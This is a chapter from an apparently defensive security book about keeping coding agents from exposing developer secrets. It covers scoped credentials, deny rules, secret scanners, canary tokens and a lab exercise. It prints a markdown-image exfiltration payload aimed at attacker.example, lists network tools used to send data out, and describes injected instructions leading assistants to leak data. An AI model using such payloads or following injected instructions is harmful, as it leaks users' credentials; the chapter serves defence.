# Secrets Exposure and Data Exfiltration

Coding agents read files to do their job, and developer machines are full of secrets. This chapter covers how secrets reach the model, how they leave, and the controls that make leaks unlikely and detectable.

## How secrets enter the context

There are four common paths:

1. **Direct reads.** The agent opens `.env`, `config/credentials.yml`, `~/.aws/credentials` or a kubeconfig while debugging a connection error.
2. **Command output.** `env`, `printenv`, `docker inspect`, verbose test logs and stack traces print secrets into tool output.
3. **Repository history.** A secret removed from `HEAD` still exists in history; `git log -p` brings it back.
4. **Inherited environment.** The agent process inherits every exported variable from the developer shell, including tokens for unrelated systems.

Once a secret is in context, it can be sent to the model provider (check your data-handling agreement), written into a file, committed, pasted into a PR description, or exfiltrated by an injected instruction.

## How secrets leave

| Channel | Example | Control |
|---|---|---|
| Shell network | `curl`, `wget`, `nc`, DNS lookups | Egress allow-list, no default network |
| Package managers | Publishing or fetching from attacker URL | Registry allow-list, no publish tokens |
| Rendered output | Markdown image URL with data in the query string | Clients that do not auto-render remote images |
| Git | Commit secret to a branch, push to fork | Push protection, scoped tokens |
| Tool calls | MCP server that posts to an external API | Separate sessions for sensitive servers |
| Logs and transcripts | Session logs stored in plain text | Redaction, retention limits |

Markdown image exfiltration is a well-documented pattern in LLM applications: if a client renders `![x](https://attacker.example/?q=SECRET)`, the fetch leaks the data. Johann Rehberger has reported variants of this against several assistants; many vendors now restrict image rendering. Terminal agents avoid rendering, but web-based and IDE agents may not.

## Controls that work

**Remove the secret from reach.** The best control is that the agent's environment has nothing worth stealing. Start the agent with a clean environment and inject only what the task needs:

```bash
env -i HOME="$HOME" PATH="/usr/bin:/bin" TERM="$TERM" agent-cli
```

**Use short-lived, scoped credentials.** A fine-grained token scoped to one repository with contents read/write, expiring in hours, limits blast radius. Cloud access should be role-based with session credentials, not static keys.

**Deny reads of secret paths** in the agent's permission policy and in the sandbox. Policy denies are advisory if the shell can still `cat` the file; the sandbox mount table is the real control.

**Scan everything the agent writes.** Run secret scanners as a pre-commit hook and in CI, so a secret the agent copies into code is caught before push:

```bash
gitleaks protect --staged --redact -v      # pre-commit (gitleaks v8)
trufflehog git file://. --only-verified    # repo history
```

GitHub push protection and similar host-side features add a server-side backstop.

**Detect with canaries.** Plant decoy credentials (Thinkst Canarytokens provides AWS keys and other types) in places an agent might look. Any use of the decoy is a high-signal alert that something read and used it.

## Worked example

> **Execution status:** not executed in this book's CI; the commands and code below are illustrative. Verify locally in an authorised lab before relying on them, and check tool flags against your installed versions.

Measure what secrets your agent can see and prove the controls hold. Use an authorised test machine.

1. Create a test repo and add a decoy `.env` with a Canarytoken AWS key and a fake database URL.
2. Start the agent normally and ask: "The app can't connect to the database; investigate." Save the transcript.
3. Search the transcript and working tree for the decoy values:

```bash
grep -c 'AKIA' session-transcript.txt
gitleaks detect --source . --no-git --redact -v
```

4. Now apply controls: start with `env -i`, add a deny rule for `.env*`, run inside the sandbox from chapter 3, and install a gitleaks pre-commit hook.
5. Repeat step 2. Confirm the transcript no longer contains the decoy, and that a deliberate attempt to commit the decoy is blocked by the hook.
6. Check the Canarytoken console. Any alert means the decoy was used, which is a finding even if the transcript looked clean.

The verification is external: grep counts, scanner exit codes and the canary console. The agent's own summary of what it read is not evidence.

## Common pitfalls

- Relying on the agent's "I will not read .env" behaviour rather than a mount or deny rule.
- Starting agents from a shell that has production credentials exported.
- Rotating a leaked token but not purging session transcripts that contain it.
- Assuming the model provider's retention terms cover every tool and MCP server in the chain.
- Running secret scanning only on the default branch, after the agent already pushed a feature branch.

## Exercises

1. Write a launcher script that starts your agent with a minimal environment and a per-task scoped token, and document what still works and what breaks.
2. Plant two Canarytokens in a sandbox repo and run five realistic debugging tasks; record which tasks touched the decoys.
3. Add gitleaks or trufflehog to pre-commit and CI, then prove both fire on a test commit containing a decoy key.

## Further reading

- [gitleaks](https://github.com/gitleaks/gitleaks) and [TruffleHog](https://github.com/trufflesecurity/trufflehog).
- [Thinkst Canarytokens](https://canarytokens.org/).
- [GitHub secret scanning and push protection documentation](https://docs.github.com/en/code-security/secret-scanning).
- OWASP Top 10 for LLM Applications, LLM02 Sensitive Information Disclosure.
- Sibling book: **ai-agent-wallet-security** for key handling by autonomous agents.
